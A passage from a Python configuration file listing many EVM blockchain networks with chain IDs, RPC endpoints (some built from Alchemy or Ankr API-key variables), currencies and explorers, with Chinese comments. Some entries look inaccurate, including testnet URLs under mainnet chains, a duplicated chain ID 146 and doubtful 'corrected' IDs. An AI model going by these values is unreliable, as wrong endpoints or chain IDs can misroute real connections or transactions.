                    'https://evm.eosnetwork.com',
                    'https://rpc.ankr.com/eos'
                ],
                'native_currency': 'EOS',
                'explorer': 'https://explorer.evm.eosnetwork.com'
            },
            
            'flare': {
                'name': '🔥 Flare',
                'chain_id': 14,
                'rpc_urls': [
                    'https://flare-api.flare.network/ext/C/rpc',
                    'https://flare.rpc.thirdweb.com',
                    'https://rpc.ankr.com/flare'
                ],
                'native_currency': 'FLR',
                'explorer': 'https://flare-explorer.flare.network'
            },
            
            'gochain': {
                'name': '🟢 GoChain',
                'chain_id': 60,
                'rpc_urls': [
                    'https://rpc.gochain.io',
                    'https://rpc2.gochain.io'
                ],
                'native_currency': 'GO',
                'explorer': 'https://explorer.gochain.io'
            },
            
            'haqq': {
                'name': '☪️ HAQQ Network',
                'chain_id': 11235,
                'rpc_urls': [
                    'https://rpc.eth.haqq.network',
                    'https://rpc.haqq.network'
                ],
                'native_currency': 'ISLM',
                'explorer': 'https://explorer.haqq.network'
            },
            
            'iotex': {
                'name': '🔗 IoTeX',
                'chain_id': 4689,
                'rpc_urls': [
                    'https://babel-api.mainnet.iotex.io',
                    'https://rpc.ankr.com/iotex'
                ],
                'native_currency': 'IOTX',
                'explorer': 'https://iotexscan.io'
            },
            
            'kcc': {
                'name': '🔶 KCC Mainnet',
                'chain_id': 321,
                'rpc_urls': [
                    'https://rpc-mainnet.kcc.network',
                    'https://kcc.mytokenpocket.vip',
                    'https://public-rpc.blockpi.io/http/kcc'
                ],
                'native_currency': 'KCS',
                'explorer': 'https://explorer.kcc.io'
            },
            
            'meter': {
                'name': '⚡ Meter',
                'chain_id': 82,
                'rpc_urls': [
                    'https://rpc.meter.io',
                    'https://rpc-meter.jellypool.xyz'
                ],
                'native_currency': 'MTR',
                'explorer': 'https://scan.meter.io'
            },
            
            'milkomeda': {
                'name': '🥛 Milkomeda C1',
                'chain_id': 2001,
                'rpc_urls': [
                    'https://rpc-mainnet-cardano-evm.c1.milkomeda.com',
                    'https://rpc.c1.milkomeda.com'
                ],
                'native_currency': 'milkADA',
                'explorer': 'https://explorer-mainnet-cardano-evm.c1.milkomeda.com'
            },
            
            'onus': {
                'name': '🅾️ ONUS Chain',
                'chain_id': 1975,
                'rpc_urls': [
                    'https://rpc.onuschain.io',
                    'https://rpc-onus.ankr.com'
                ],
                'native_currency': 'ONUS',
                'explorer': 'https://explorer.onuschain.io'
            },
            
            'pulsechain': {
                'name': '💓 PulseChain',
                'chain_id': 369,
                'rpc_urls': [
                    'https://rpc.pulsechain.com',
                    'https://rpc-pulsechain.g4mm4.io',
                    'https://pulsechain.publicnode.com'
                ],
                'native_currency': 'PLS',
                'explorer': 'https://scan.pulsechain.com'
            },
            
            'rei': {
                'name': '👑 REI Network',
                'chain_id': 47805,
                'rpc_urls': [
                    'https://rpc.rei.network',
                    'https://rei-rpc.moonrhythm.io'
                ],
                'native_currency': 'REI',
                'explorer': 'https://scan.rei.network'
            },
            
            'rootstock': {
                'name': '🟨 Rootstock (RSK)',
                'chain_id': 30,
                'rpc_urls': [
                    'https://public-node.rsk.co',
                    'https://mycrypto.rsk.co'
                ],
                'native_currency': 'RBTC',
                'explorer': 'https://explorer.rsk.co'
            },
            
            'smartbch': {
                'name': '💚 SmartBCH',
                'chain_id': 10000,
                'rpc_urls': [
                    'https://smartbch.greyh.at',
                    'https://rpc.uatvo.com'
                ],
                'native_currency': 'BCH',
                'explorer': 'https://smartbch.org'
            },
            
            'songbird': {
                'name': '🐦 Songbird',
                'chain_id': 19,
                'rpc_urls': [
                    'https://songbird-api.flare.network/ext/C/rpc',
                    'https://rpc.ankr.com/songbird'
                ],
                'native_currency': 'SGB',
                'explorer': 'https://songbird-explorer.flare.network'
            },
            
            'syscoin': {
                'name': '🔷 Syscoin NEVM',
                'chain_id': 57,
                'rpc_urls': [
                    'https://rpc.syscoin.org',
                    'https://syscoin-evm.publicnode.com'
                ],
                'native_currency': 'SYS',
                'explorer': 'https://explorer.syscoin.org'
            },
            
            'thundercore': {
                'name': '⚡ ThunderCore',
                'chain_id': 108,
                'rpc_urls': [
                    'https://mainnet-rpc.thundercore.com',
                    'https://mainnet-rpc.thundertoken.net'
                ],
                'native_currency': 'TT',
                'explorer': 'https://scan.thundercore.com'
            },
            
            'tomochain': {
                'name': '🟢 TomoChain',
                'chain_id': 88,
                'rpc_urls': [
                    'https://rpc.tomochain.com',
                    'https://tomo.blockpi.network/v1/rpc/public',
                    'https://rpc.ankr.com/tomochain',
                    # Alchemy (付费) - 需要验证是否支持
                    f'https://tomochain-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}'
                ],
                'native_currency': 'TOMO',
                'explorer': 'https://tomoscan.io'
            },
            
            'velas': {
                'name': '🔮 Velas',
                'chain_id': 106,
                'rpc_urls': [
                    'https://evmexplorer.velas.com/rpc',
                    'https://velas-mainnet.rpcfast.com'
                ],
                'native_currency': 'VLX',
                'explorer': 'https://evmexplorer.velas.com'
            },
            
            'wanchain': {
                'name': '🌊 Wanchain',
                'chain_id': 888,
                'rpc_urls': [
                    'https://gwan-ssl.wandevs.org:56891',
                    'https://wanchain-mainnet.gateway.pokt.network/v1/lb/6144d7b3e536190038c92fd2'
                ],
                'native_currency': 'WAN',
                'explorer': 'https://wanscan.org'
            },
            
            'xdc': {
                'name': '🔶 XDC Network',
                'chain_id': 50,
                'rpc_urls': [
                    'https://rpc.xdcrpc.com',
                    'https://rpc1.xinfin.network',
                    'https://rpc.xinfin.network'
                ],
                'native_currency': 'XDC',
                'explorer': 'https://explorer.xinfin.network'
            },
            
            # ==== 🌟 更多主网链条 ====
            'acala': {
                'name': '🟣 Acala Network',
                'chain_id': 787,
                'rpc_urls': [
                    'https://eth-rpc-acala.aca-api.network',
                    'https://rpc.evm.acala.network'
                ],
                'native_currency': 'ACA',
                'explorer': 'https://blockscout.acala.network'
            },
            
            'aioz': {
                'name': '🚀 AIOZ Network',
                'chain_id': 168,
                'rpc_urls': [
                    'https://eth-dataseed.aioz.network'
                ],
                'native_currency': 'AIOZ',
                'explorer': 'https://explorer.aioz.network'
            },
            
            'ambrosus': {
                'name': '🛸 Ambrosus',
                'chain_id': 16718,
                'rpc_urls': [
                    'https://network.ambrosus.io',
                    'https://network.ambrosus.com'
                ],
                'native_currency': 'AMB',
                'explorer': 'https://explorer.ambrosus.io'
            },
            
            'artis': {
                'name': '🎨 ARTIS',
                'chain_id': 246529,
                'rpc_urls': [
                    'https://rpc.artis.network'
                ],
                'native_currency': 'ATS',
                'explorer': 'https://explorer.artis.network'
            },
            
            'bittorrent': {
                'name': '🏴 BitTorrent Chain',
                'chain_id': 199,
                'rpc_urls': [
                    'https://rpc.bittorrentchain.io',
                    'https://rpc.bt.io'
                ],
                'native_currency': 'BTT',
                'explorer': 'https://bttcscan.com'
            },
            
            'bitkub': {
                'name': '🟢 Bitkub Chain',
                'chain_id': 96,
                'rpc_urls': [
                    'https://rpc.bitkubchain.io',
                    'https://rpc-l1.bitkubchain.io'
                ],
                'native_currency': 'KUB',
                'explorer': 'https://bkcscan.com'
            },
            
            'callisto': {
                'name': '🌙 Callisto Network',
                'chain_id': 207,  # ✅ 更新正确链ID
                'rpc_urls': [
                    'https://clo-geth.0xinfra.com'
                ],
                'native_currency': 'CLO',
                'explorer': 'https://explorer.callisto.network'
            },
            
            'catecoin': {
                'name': '🐱 Catecoin Chain',
                'chain_id': 1618,
                'rpc_urls': [
                    'https://send.catechain.com'
                ],
                'native_currency': 'CATE',
                'explorer': 'https://explorer.catechain.com'
            },
            
            'cheapeth': {
                'name': '💰 cheapETH',
                'chain_id': 777777,
                'rpc_urls': [
                    'https://node.cheapeth.org/rpc'
                ],
                'native_currency': 'cETH',
                'explorer': 'https://explorer.cheapeth.org'
            },
            
            'clover': {
                'name': '🍀 Clover',
                'chain_id': 1024,
                'rpc_urls': [
                    'https://rpc-ivy.clover.finance',
                    'https://rpc-ivy-2.clover.finance'
                ],
                'native_currency': 'CLV',
                'explorer': 'https://clvscan.com'
            },
            
            'coinex': {
                'name': '🔵 CoinEx Smart Chain',
                'chain_id': 52,
                'rpc_urls': [
                    'https://rpc.coinex.net',
                    'https://rpc1.coinex.net'
                ],
                'native_currency': 'CET',
                'explorer': 'https://www.coinex.net'
            },
            
            'conflux': {
                'name': '🌊 Conflux eSpace',
                'chain_id': 1030,
                'rpc_urls': [
                    'https://evm.confluxrpc.com',
                    'https://evm.confluxrpc.org'
                ],
                'native_currency': 'CFX',
                'explorer': 'https://evm.confluxscan.net'
            },
            
            'cube': {
                'name': '🎲 Cube Network',
                'chain_id': 1818,
                'rpc_urls': [
                    'https://http-mainnet.cube.network',
                    'https://http-mainnet-sg.cube.network'
                ],
                'native_currency': 'CUBE',
                'explorer': 'https://cubescan.network'
            },
            
            'darwinia': {
                'name': '🦀 Darwinia Network',
                'chain_id': 46,
                'rpc_urls': [
                    'https://rpc.darwinia.network'
                ],
                'native_currency': 'RING',
                'explorer': 'https://explorer.darwinia.network'
            },
            
            'elastos': {
                'name': '🔗 Elastos EVM',
                'chain_id': 20,
                'rpc_urls': [
                    'https://api.elastos.io/esc',
                    'https://api.trinity-tech.cn/esc'
                ],
                'native_currency': 'ELA',
                'explorer': 'https://esc.elastos.io'
            },
            
            'energi': {
                'name': '⚡ Energi',
                'chain_id': 39797,
                'rpc_urls': [
                    'https://nodeapi.energi.network'
                ],
                'native_currency': 'NRG',
                'explorer': 'https://explorer.energi.network'
            },
            
            'ethpow': {
                'name': '⛏️ EthereumPoW',
                'chain_id': 10001,
                'rpc_urls': [
                    'https://mainnet.ethereumpow.org'
                ],
                'native_currency': 'ETHW',
                'explorer': 'https://www.oklink.com/ethw'
            },
            
            'expanse': {
                'name': '🌌 Expanse Network',
                'chain_id': 2,
                'rpc_urls': [
                    'https://node.expanse.tech'
                ],
                'native_currency': 'EXP',
                'explorer': 'https://explorer.expanse.tech'
            },
            
            'functionx': {
                'name': '🔧 Function X',
                'chain_id': 530,
                'rpc_urls': [
                    'https://fx-json-web3.functionx.io:8545'
                ],
                'native_currency': 'FX',
                'explorer': 'https://explorer.functionx.io'
            },
            
            'gatechain': {
                'name': '🚪 GateChain',
                'chain_id': 86,
                'rpc_urls': [
                    'https://evm.gatenode.cc'
                ],
                'native_currency': 'GT',
                'explorer': 'https://gatescan.org'
            },
            
            'hoo': {
                'name': '🦉 Hoo Smart Chain',
                'chain_id': 70,
                'rpc_urls': [
                    'https://http-mainnet.hoosmartchain.com'
                ],
                'native_currency': 'HOO',
                'explorer': 'https://hooscan.com'
            },
            
            'kekchain': {
                'name': '🐸 KekChain',
                'chain_id': 420420,
                'rpc_urls': [
                    'https://mainnet.kekchain.com'
                ],
                'native_currency': 'KEK',
                'explorer': 'https://mainnet-explorer.kekchain.com'
            },
            

            
            'lightstreams': {
                'name': '💡 Lightstreams',
                'chain_id': 163,
                'rpc_urls': [
                    'https://node.mainnet.lightstreams.io'
                ],
                'native_currency': 'PHT',
                'explorer': 'https://explorer.lightstreams.io'
            },
            
            'lukso': {
                'name': '🎯 LUKSO',
                'chain_id': 42,
                'rpc_urls': [
                    'https://rpc.mainnet.lukso.network',
                    'https://42.rpc.thirdweb.com'
                ],
                'native_currency': 'LYX',
                'explorer': 'https://explorer.execution.mainnet.lukso.network'
            },
            
            'metadium': {
                'name': '🆔 Metadium',
                'chain_id': 11,
                'rpc_urls': [
                    'https://api.metadium.com/prod'
                ],
                'native_currency': 'META',
                'explorer': 'https://explorer.metadium.com'
            },
            
            'newton': {
                'name': '🍎 Newton',
                'chain_id': 1012,
                'rpc_urls': [
                    'https://rpc1.newchain.newtonproject.org',
                    # Alchemy (付费)
                    f'https://newton-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}'
                ],
                'native_currency': 'NEW',
                'explorer': 'https://explorer.newtonproject.org'
            },
            
            'pirl': {
                'name': '⚪ Pirl',
                'chain_id': 3125659152,
                'rpc_urls': [
                    'https://wallrpc.pirl.io'
                ],
                'native_currency': 'PIRL',
                'explorer': 'https://explorer.pirl.io'
            },
            
            'theta': {
                'name': '🎬 Theta',
                'chain_id': 361,
                'rpc_urls': [
                    'https://eth-rpc-api.thetatoken.org/rpc'
                ],
                'native_currency': 'TFUEL',
                'explorer': 'https://explorer.thetatoken.org'
            },
            
            'ubiq': {
                'name': '💎 Ubiq',
                'chain_id': 8,
                'rpc_urls': [
                    'https://rpc.octano.dev',
                    'https://pyrus2.ubiqscan.io'
                ],
                'native_currency': 'UBQ',
                'explorer': 'https://ubiqscan.io'
            },
            
            'wemix': {
                'name': '🎮 WEMIX',
                'chain_id': 1111,
                'rpc_urls': [
                    'https://api.wemix.com',
                    'https://api.test.wemix.com'
                ],
                'native_currency': 'WEMIX',
                'explorer': 'https://explorer.wemix.com'
            },
            
            'xerom': {
                'name': '⚫ Xerom',
                'chain_id': 1313,
                'rpc_urls': [
                    'https://rpc.xerom.org'
                ],
                'native_currency': 'XERO',
                'explorer': 'https://explorer.xerom.org'
            },
            
            'zilliqa': {
                'name': '🔷 Zilliqa',
                'chain_id': 32769,
                'rpc_urls': [
                    'https://api.zilliqa.com'
                ],
                'native_currency': 'ZIL',
                'explorer': 'https://viewblock.io/zilliqa'
            },
            
            # ==== 🌐 第三批主网链条 ====
            'aelf': {
                'name': '🔷 AELF',
                'chain_id': 1212,
                'rpc_urls': [
                    'https://rpc.aelf.io'
                ],
                'native_currency': 'ELF',
                'explorer': 'https://explorer.aelf.io'
            },
            
            'bitrock': {
                'name': '🪨 Bitrock',
                'chain_id': 7171,
                'rpc_urls': [
                    'https://brockrpc.io'
                ],
                'native_currency': 'BROCK',
                'explorer': 'https://explorer.bit-rock.io'
            },
            
            'crossfi': {
                'name': '✖️ CrossFi',
                'chain_id': 4157,
                'rpc_urls': [
                    'https://rpc.crossfi.io'
                ],
                'native_currency': 'XFI',
                'explorer': 'https://scan.crossfi.io'
            },
            
            'dexit': {
                'name': '🚪 Dexit Network',
                'chain_id': 2036,
                'rpc_urls': [
                    'https://rpc.dexit.network'
                ],
                'native_currency': 'DXT',
                'explorer': 'https://explorer.dexit.network'
            },
            
            'ecoball': {
                'name': '🌱 Ecoball',
                'chain_id': 2100,
                'rpc_urls': [
                    'https://api.ecoball.org/evm'
                ],
                'native_currency': 'ECO',
                'explorer': 'https://scan.ecoball.org'
            },
            

            
            'etho': {
                'name': '🔮 Etho Protocol',
                'chain_id': 1313114,
                'rpc_urls': [
                    'https://rpc.ethoprotocol.com'
                ],
                'native_currency': 'ETHO',
                'explorer': 'https://explorer.ethoprotocol.com'
            },
            
            'evadore': {
                'name': '🔸 Evadore',
                'chain_id': 3918,
                'rpc_urls': [
                    'https://rpc.evadore.com'
                ],
                'native_currency': 'EVA',
                'explorer': 'https://explorer.evadore.com'
            },
            
            'findora': {
                'name': '🔍 Findora',
                'chain_id': 2152,
                'rpc_urls': [
                    'https://rpc-mainnet.findora.org'
                ],
                'native_currency': 'FRA',
                'explorer': 'https://evm.findorascan.io'
            },
            
            'genechain': {
                'name': '🧬 GeneChain',
                'chain_id': 5566,
                'rpc_urls': [
                    'https://rpc.genechain.io'
                ],
                'native_currency': 'GENE',
                'explorer': 'https://scan.genechain.io'
            },
            
            'gooddata': {
                'name': '📊 GoodData',
                'chain_id': 32659,
                'rpc_urls': [
                    'https://rpc.goodata.io'
                ],
                'native_currency': 'GDD',
                'explorer': 'https://explorer.goodata.io'
            },
            
            'halo': {
                'name': '👼 HALO Network',
                'chain_id': 500,
                'rpc_urls': [
                    'https://rpc.halo.land'
                ],
                'native_currency': 'HALO',
                'explorer': 'https://scan.halo.land'
            },
            
            'hook': {
                'name': '🪝 HOOK',
                'chain_id': 5112,
                'rpc_urls': [
                    'https://rpc.hook.xyz'
                ],
                'native_currency': 'HOOK',
                'explorer': 'https://explorer.hook.xyz'
            },
            
            'injective': {
                'name': '💉 Injective EVM',
                'chain_id': 2525,
                'rpc_urls': [
                    'https://evm.injective.network'
                ],
                'native_currency': 'INJ',
                'explorer': 'https://explorer.injective.network'
            },
            
            'ipos': {
                'name': '🏛️ IPOS Network',
                'chain_id': 1122334455,
                'rpc_urls': [
                    'https://rpc.ipos.network'
                ],
                'native_currency': 'IPOS',
                'explorer': 'https://scan.ipos.network'
            },
            

            
            'lambda': {
                'name': '🧮 Lambda Chain',
                'chain_id': 56026,
                'rpc_urls': [
                    'https://nrpc.lambda.im'
                ],
                'native_currency': 'LAMB',
                'explorer': 'https://scan.lambda.im'
            },
            
            'laocat': {
                'name': '🐱 LaoCat',
                'chain_id': 6886,
                'rpc_urls': [
                    'https://rpc.laocat.com'
                ],
                'native_currency': 'CAT',
                'explorer': 'https://scan.laocat.com'
            },
            
            'lucky': {
                'name': '🍀 Lucky Network',
                'chain_id': 9888,
                'rpc_urls': [
                    'https://rpc.luckynetwork.org'
                ],
                'native_currency': 'LUCKY',
                'explorer': 'https://scan.luckynetwork.org'
            },
            
            'luminarylabs': {
                'name': '💡 LuminaryLabs',
                'chain_id': 3737,
                'rpc_urls': [
                    'https://rpc.luminarylabs.io'
                ],
                'native_currency': 'LUM',
                'explorer': 'https://explorer.luminarylabs.io'
            },
            
            'map_protocol': {
                'name': '🗺️ MAP Protocol',
                'chain_id': 22776,
                'rpc_urls': [
                    'https://rpc.maplabs.io'
                ],
                'native_currency': 'MAPO',
                'explorer': 'https://maposcan.io'
            },
            
            'mathchain': {
                'name': '🔢 MathChain',
                'chain_id': 1139,
                'rpc_urls': [
                    'https://mathchain-asia.maiziqianbao.net/rpc',
                    'https://mathchain-us.maiziqianbao.net/rpc'
                ],
                'native_currency': 'MATH',
                'explorer': 'https://scan.mathchain.org'
            },
            
            'metadot': {
                'name': '🔴 MetaDot',
                'chain_id': 16000,
                'rpc_urls': [
                    'https://rpc.metadot.network'
                ],
                'native_currency': 'MTD',
                'explorer': 'https://explorer.metadot.network'
            },
            
            'mint': {
                'name': '🌿 Mint',
                'chain_id': 185,
                'rpc_urls': [
                    'https://rpc.mintchain.io'
                ],
                'native_currency': 'MINT',
                'explorer': 'https://explorer.mintchain.io'
            },
            
            'moonrock': {
                'name': '🌙 Moonrock',
                'chain_id': 1011,
                'rpc_urls': [
                    'https://rpc.moonrock.network'
                ],
                'native_currency': 'ROCK',
                'explorer': 'https://explorer.moonrock.network'
            },
            
            'moonshadow': {
                'name': '🌑 Moonshadow',
                'chain_id': 1010,
                'rpc_urls': [
                    'https://rpc.moonshadow.network'
                ],
                'native_currency': 'SHADOW',
                'explorer': 'https://explorer.moonshadow.network'
            },
            
            'permission': {
                'name': '🔐 Permission',
                'chain_id': 69420,
                'rpc_urls': [
                    'https://rpc.permission.io'
                ],
                'native_currency': 'ASK',
                'explorer': 'https://explorer.permission.io'
            },
            
            'polis': {
                'name': '🏛️ Polis',
                'chain_id': 333999,
                'rpc_urls': [
                    'https://rpc.polis.tech'
                ],
                'native_currency': 'POLIS',
                'explorer': 'https://explorer.polis.tech'
            },
            
            'popcateum': {
                'name': '🐱 Popcateum',
                'chain_id': 1213,
                'rpc_urls': [
                    'https://dataseed.popcateum.org'
                ],
                'native_currency': 'POP',
                'explorer': 'https://explorer.popcateum.org'
            },
            
            'primuschain': {
                'name': '🥇 PrimusChain',
                'chain_id': 78,
                'rpc_urls': [
                    'https://ethnode.primusmoney.com/mainnet'
                ],
                'native_currency': 'PRIM',
                'explorer': 'https://explorer.primusmoney.com'
            },
            
            'quarkchain': {
                'name': '⚛️ QuarkChain',
                'chain_id': 100001,
                'rpc_urls': [
                    'https://mainnet-s0-ethapi.quarkchain.io',
                    'https://mainnet-s1-ethapi.quarkchain.io'
                ],
                'native_currency': 'QKC',
                'explorer': 'https://mainnet.quarkchain.io'
            },
            
            'rupaya': {
                'name': '💰 Rupaya',
                'chain_id': 499,
                'rpc_urls': [
                    'https://rpc.rupaya.io'
                ],
                'native_currency': 'RUPX',
                'explorer': 'https://scan.rupaya.io'
            },
            
            'sakura': {
                'name': '🌸 Sakura',
                'chain_id': 1022,
                'rpc_urls': [
                    'https://rpc.sakura.network'
                ],
                'native_currency': 'SKU',
                'explorer': 'https://explorer.sakura.network'
            },
            
            'saakuru': {
                'name': '🎯 Saakuru',
                'chain_id': 7225878,
                'rpc_urls': [
                    'https://rpc.saakuru.network'
                ],
                'native_currency': 'OAS',
                'explorer': 'https://explorer.saakuru.network'
            },
            
            'shibachain': {
                'name': '🐕 ShibaChain',
                'chain_id': 27,
                'rpc_urls': [
                    'https://rpc.shibachain.net'
                ],
                'native_currency': 'SHIB',
                'explorer': 'https://exp.shibachain.net'
            },
            
            'skale': {
                'name': '⚙️ Skale',
                'chain_id': 1564830818,  # ✅ 更新正确链ID
                'rpc_urls': [
                    'https://mainnet.skalenodes.com'
                ],
                'native_currency': 'SKL',
                'explorer': 'https://elated-tan-skat.explorer.mainnet.skalenodes.com'
            },
            
            'sonic_labs': {
                'name': '🎵 Sonic Labs',
                'chain_id': 146,
                'rpc_urls': [
                    'https://rpc.sonic.mainnet.org',
                    # Ankr (付费)
                    f'https://rpc.ankr.com/sonic/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'S',
                'explorer': 'https://sonicscan.org'
            },
            
            'soterone': {
                'name': '1️⃣ SoterOne',
                'chain_id': 218,
                'rpc_urls': [
                    'https://rpc.soter.one'
                ],
                'native_currency': 'SOTER',
                'explorer': 'https://explorer.soter.one'
            },
            
            'step': {
                'name': '👣 Step Network',
                'chain_id': 1234,
                'rpc_urls': [
                    'https://rpc.step.network'
                ],
                'native_currency': 'FITFI',
                'explorer': 'https://stepscan.io'
            },
            
            'tao': {
                'name': '☯️ Tao Network',
                'chain_id': 558,
                'rpc_urls': [
                    'https://rpc.tao.network',
                    'https://rpc.testnet.tao.network'
                ],
                'native_currency': 'TAO',
                'explorer': 'https://scan.tao.network'
            },
            
            'taraxa': {
                'name': '🌀 Taraxa',
                'chain_id': 841,
                'rpc_urls': [
                    'https://rpc.mainnet.taraxa.io'
                ],
                'native_currency': 'TARA',
                'explorer': 'https://explorer.mainnet.taraxa.io'
            },
            
            'teslafunds': {
                'name': '⚡ Teslafunds',
                'chain_id': 1856,
                'rpc_urls': [
                    'https://tsfapi.europool.me'
                ],
                'native_currency': 'TSF',
                'explorer': 'https://explorer.teslafunds.io'
            },
            
            'thaichain': {
                'name': '🇹🇭 ThaiChain',
                'chain_id': 7,
                'rpc_urls': [
                    'https://rpc.thaichain.org'
                ],
                'native_currency': 'TCH',
                'explorer': 'https://exp.thaichain.org'
            },
            
            'vana': {
                'name': '🔮 Vana',
                'chain_id': 1480,
                'rpc_urls': [
                    'https://rpc.vana.org'
                ],
                'native_currency': 'VANA',
                'explorer': 'https://explorer.vana.org'
            },
            
            'viction': {
                'name': '🏆 Viction',
                'chain_id': 88,
                'rpc_urls': [
                    'https://rpc.viction.xyz'
                ],
                'native_currency': 'VIC',
                'explorer': 'https://www.vicscan.xyz'
            },
            
            'vision': {
                'name': '👁️ Vision Chain',
                'chain_id': 123456,
                'rpc_urls': [
                    'https://rpc.visionchain.org'
                ],
                'native_currency': 'VISION',
                'explorer': 'https://explorer.visionchain.org'
            },
            
            'zyx': {
                'name': '🌌 Zyx Mainnet',
                'chain_id': 55,
                'rpc_urls': [
                    'https://rpc-1.zyx.network',
                    'https://rpc-2.zyx.network'
                ],
                'native_currency': 'ZYX',
                'explorer': 'https://zyxscan.com'
            },
            
            # ==== 🚀 新兴热门链条 ====
            'apechain': {
                'name': '🐵 ApeChain',
                'chain_id': 33139,
                'rpc_urls': [
                    'https://apechain.calderachain.xyz/http'
                ],
                'native_currency': 'APE',
                'explorer': 'https://apechain.calderaexplorer.xyz'
            },
            
            'bevm': {
                'name': '₿ BEVM',
                'chain_id': 11501,
                'rpc_urls': [
                    'https://rpc-mainnet-1.bevm.io',
                    'https://rpc-mainnet-2.bevm.io'
                ],
                'native_currency': 'BTC',
                'explorer': 'https://scan-mainnet.bevm.io'
            },
            
            'sonic': {
                'name': '🎵 Sonic',
                'chain_id': 146,
                'rpc_urls': [
                    'https://rpc.sonic.fantom.network',
                    # Alchemy (付费)
                    f'https://sonic-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}'
                ],
                'native_currency': 'S',
                'explorer': 'https://sonicscan.org'
            },
            
            'story': {
                'name': '📚 Story',
                'chain_id': 1513,
                'rpc_urls': [
                    'https://rpc.story.foundation'
                ],
                'native_currency': 'STORY',
                'explorer': 'https://testnet.storyscan.xyz'
            },
            
            'taproot': {
                'name': '🌳 TAPROOT',
                'chain_id': 9527,
                'rpc_urls': [
                    'https://rpc.taproot.network'
                ],
                'native_currency': 'TAP',
                'explorer': 'https://explorer.taproot.network'
            },
            
            'unichain': {
                'name': '🦄 Unichain',
                'chain_id': 130,  # ✅ 更新正确链ID
                'rpc_urls': [
                    'https://rpc.unichain.org'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://uniscan.xyz'
            },
            
            # ==== 🌈 LAYER 2 网络 (按首字母排序) ====
            'abstract': {
                'name': '🔮 Abstract',
                'chain_id': 1113,  # ✅ 更新正确链ID
                'rpc_urls': [
                    'https://api.abstract.xyz/rpc'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://explorer.abstract.xyz'
            },
            
            'arbitrum': {
                'name': '🟦 Arbitrum One',
                'chain_id': 42161,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://arbitrum.publicnode.com',
                    'https://arbitrum.blockpi.network/v1/rpc/public',
                    'https://arb1.arbitrum.io/rpc',
                    'https://arbitrum.llamarpc.com',
                    'https://arbitrum.drpc.org',
                    'https://endpoints.omniatech.io/v1/arbitrum/one/public',
                    'https://1rpc.io/arb',
                    # ALCHEMY (备用)
                    f'https://arb-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr (最后备用)
                    f'https://rpc.ankr.com/arbitrum/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://arbiscan.io'
            },
            
            'arbitrum_nova': {
                'name': '🔵 Arbitrum Nova',
                'chain_id': 42170,
                'rpc_urls': [
                    f'https://arbnova-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    'https://nova.arbitrum.io/rpc'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://nova.arbiscan.io'
            },
            
            'base': {
                'name': '🔷 Base',
                'chain_id': 8453,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://base.publicnode.com',
                    'https://base.blockpi.network/v1/rpc/public',
                    'https://mainnet.base.org',
                    'https://base.llamarpc.com',
                    'https://base.drpc.org',
                    'https://endpoints.omniatech.io/v1/base/mainnet/public',
                    'https://1rpc.io/base',
                    # ALCHEMY (备用)
                    f'https://base-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr (最后备用)
                    f'https://rpc.ankr.com/base/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://basescan.org'
            },
            
            'blast': {
                'name': '💥 Blast',
                'chain_id': 81457,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://rpc.blast.io',
                    'https://blast.llamarpc.com',
                    'https://blast.blockpi.network/v1/rpc/public',
                    'https://blast.drpc.org',
                    'https://endpoints.omniatech.io/v1/blast/mainnet/public',
                    'https://1rpc.io/blast',
                    'https://blast.gasswap.org',
                    # ALCHEMY (备用)
                    f'https://blast-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr (最后备用)
                    f'https://rpc.ankr.com/blast/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://blastscan.io'
            },
            
            'b2_network': {
                'name': '🅱️ B² Network',
                'chain_id': 223,
                'rpc_urls': [
                    'https://rpc.bsquared.network',
                    'https://b2-mainnet.alt.technology'
                ],
                'native_currency': 'BTC',
                'explorer': 'https://explorer.bsquared.network'
            },
            
            'boba': {
                'name': '🧋 Boba Network',
                'chain_id': 288,
                'rpc_urls': [
                    'https://mainnet.boba.network',
                    'https://boba.publicnode.com',
                    'https://rpc.ankr.com/boba',
                    'https://boba.llamarpc.com'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://bobascan.com'
            },
            
            'linea': {
                'name': '🟢 Linea',
                'chain_id': 59144,
                'rpc_urls': [
                    # 公共RPC (优先)
                    'https://rpc.linea.build',
                    'https://linea.blockpi.network/v1/rpc/public',
                    'https://linea.drpc.org',
                    'https://endpoints.omniatech.io/v1/linea/mainnet/public',
                    'https://1rpc.io/linea',
                    'https://linea-mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
                    # ALCHEMY (备用)
                    f'https://linea-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
                    # Ankr (最后备用)
                    f'https://rpc.ankr.com/linea/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://lineascan.build'
            },
            
            'manta': {
                'name': '🦈 Manta Pacific',
                'chain_id': 169,
                'rpc_urls': [
                    # 公共节点
                    'https://pacific-rpc.manta.network/http',
                    'https://manta-pacific.drpc.org',
                    'https://r1.pacific.manta.systems/http',
                    'https://manta.public-rpc.com',
                    # Ankr
                    f'https://rpc.ankr.com/manta/{self.ANKR_API_KEY}'
                ],
                'native_currency': 'ETH',
                'explorer': 'https://pacific-explorer.manta.network'
            },
            
            'mantle': {
                'name': '🧥 Mantle',
                'chain_id': 5000,
                'rpc_urls': [
                    'https://rpc.mantle.xyz',
                    'https://mantle.publicnode.com',
                    'https://mantle.llamarpc.com',
                    'https://rpc.ankr.com/mantle'
                ],
                'native_currency': 'MNT',
                'explorer': 'https://explorer.mantle.xyz'
            },
            
            'metis': {
                'name': '🌌 Metis Andromeda',
                'chain_id': 1088,
                'rpc_urls': [
